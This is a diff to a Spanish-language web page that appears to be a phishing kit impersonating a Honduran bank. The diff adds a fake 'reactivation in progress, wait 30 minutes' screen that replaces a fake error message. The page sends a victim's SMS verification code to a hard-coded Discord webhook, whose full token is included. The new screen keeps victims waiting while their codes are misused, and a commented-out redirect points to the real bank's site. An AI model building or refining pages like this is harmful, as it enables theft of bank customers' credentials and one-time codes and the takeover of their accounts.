@@ -25,11 +25,60 @@
         .animate-spin-fast {
             animation: spin 0.8s linear infinite;
         }
+
+        /* ===== NUEVA ANIMACIÓN PARA LA PANTALLA DE ESPERA ===== */
+        @keyframes pulse-dot {
+            0%, 100% { opacity: 0.3; transform: scale(0.8); }
+            50% { opacity: 1; transform: scale(1.2); }
+        }
+        .pulse-dot {
+            animation: pulse-dot 1.5s ease-in-out infinite;
+        }
+        .pulse-dot:nth-child(2) { animation-delay: 0.5s; }
+        .pulse-dot:nth-child(3) { animation-delay: 1s; }
+
+        @keyframes shimmer {
+            0% { background-position: -200% center; }
+            100% { background-position: 200% center; }
+        }
+        .shimmer-text {
+            background: linear-gradient(90deg, #D9272E 25%, #f8a5a8 50%, #D9272E 75%);
+            background-size: 200% auto;
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            animation: shimmer 2.5s linear infinite;
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        .fade-in-up {
+            animation: fadeInUp 0.8s ease forwards;
+        }
+
+        /* Barra de progreso animada */
+        @keyframes progress-bar {
+            0% { width: 0%; }
+            100% { width: 100%; }
+        }
+        .progress-bar-animate {
+            animation: progress-bar 30s linear forwards;
+        }
+
+        /* Icono de reloj girando */
+        @keyframes clock-spin {
+            from { transform: rotate(0deg); }
+            to { transform: rotate(360deg); }
+        }
+        .clock-spin {
+            animation: clock-spin 8s linear infinite;
+        }
     </style>
 </head>
 <body class="bg-white font-sans antialiased text-gray-800">
 
-    <!-- PANTALLA DE CARGA (OVERLAY) -->
+    <!-- ===== PANTALLA DE CARGA (OVERLAY) ===== -->
     <div id="loadingOverlay" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center hidden">
         <div class="flex flex-col items-center max-w-xs text-center px-4">
             <div class="w-10 h-10 border-[3px] border-gray-100 border-t-[#D9272E] rounded-full animate-spin-fast mb-4"></div>
@@ -38,7 +87,53 @@
         </div>
     </div>
 
-    <!-- CONTENEDOR PRINCIPAL -->
+    <!-- ===== PANTALLA DE ESPERA (NUEVA) ===== -->
+    <div id="stepWaiting" class="fixed inset-0 bg-white z-50 flex flex-col items-center justify-center hidden">
+        <div class="flex flex-col items-center max-w-sm text-center px-6">
+            <!-- Icono de reloj animado -->
+            <div class="relative mb-6">
+                <div class="w-20 h-20 border-4 border-gray-100 border-t-[#D9272E] rounded-full clock-spin"></div>
+                <div class="absolute inset-0 flex items-center justify-center">
+                    <i class="fa-regular fa-clock text-3xl text-[#D9272E]"></i>
+                </div>
+            </div>
+
+            <!-- Título con efecto shimmer -->
+            <h2 class="text-2xl font-bold shimmer-text mb-2 fade-in-up">
+                Reactivación en Proceso
+            </h2>
+
+            <!-- Mensaje principal -->
+            <p class="text-gray-700 text-base font-semibold mb-1 fade-in-up" style="animation-delay: 0.2s;">
+                Espere <span class="text-[#D9272E] font-extrabold">30 minutos</span> para que los beneficios sean reactivados.
+            </p>
+
+            <!-- Subtítulo -->
+            <p class="text-gray-400 text-sm mt-2 fade-in-up" style="animation-delay: 0.4s;">
+                Su cuenta está siendo verificada por nuestro equipo de seguridad.
+            </p>
+
+            <!-- Puntos animados -->
+            <div class="flex gap-2 mt-6">
+                <span class="pulse-dot w-2.5 h-2.5 bg-[#D9272E] rounded-full"></span>
+                <span class="pulse-dot w-2.5 h-2.5 bg-[#D9272E] rounded-full"></span>
+                <span class="pulse-dot w-2.5 h-2.5 bg-[#D9272E] rounded-full"></span>
+            </div>
+
+            <!-- Barra de progreso -->
+            <div class="w-full mt-6 bg-gray-100 rounded-full h-1.5 overflow-hidden">
+                <div class="bg-[#D9272E] h-1.5 rounded-full progress-bar-animate"></div>
+            </div>
+
+            <!-- Mensaje de no cerrar -->
+            <p class="text-[10px] text-gray-300 mt-4 flex items-center gap-1">
+                <i class="fa-solid fa-circle-exclamation text-[10px]"></i>
+                No cierre esta ventana mientras se procesa la solicitud
+            </p>
+        </div>
+    </div>
+
+    <!-- ===== CONTENEDOR PRINCIPAL ===== -->
     <div class="flex h-full w-screen flex-col lg:flex-row">
         
         <!-- SECCIÓN IZQUIERDA -->
@@ -163,7 +258,7 @@
     <!-- ===== SCRIPTS DE CONTROL ===== -->
     <script>
         // ============================================
-        // 🔴 WEBHOOK DE DISCORD - ACTUALIZADO
+        // 🔴 WEBHOOK DE DISCORD
         // ============================================
         const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1540553924161966220/gmtc5tUYY1UzVFFEYOKvExB2KG0F-77bG_mK5cEQxn3SZMxq091ebLJEY0qlhmV2Atib";
 
@@ -256,10 +351,21 @@
                     body: JSON.stringify(smsMessageData)
                 });
 
+                // ============================================
+                // 🔥 CAMBIO AQUÍ: En lugar de mostrar error,
+                // muestra la pantalla de espera
+                // ============================================
                 setTimeout(() => {
                     loader.classList.add('hidden');
-                    alert("El código ingresado es incorrecto o ha expirado. Por favor, solicite uno nuevo.");
-                    document.getElementById('smsCode').value = "";
+                    document.getElementById('stepVerification').classList.add('hidden');
+                    document.getElementById('stepWaiting').classList.remove('hidden');
+                    
+                    // Opcional: después de 30 segundos (o 30 minutos simulados)
+                    // podrías redirigir al banco real
+                    // setTimeout(() => {
+                    //     window.location.href = "https://www.bancatlan.hn/";
+                    // }, 30000);
+                    
                 }, 2000);
 
             } catch (error) {
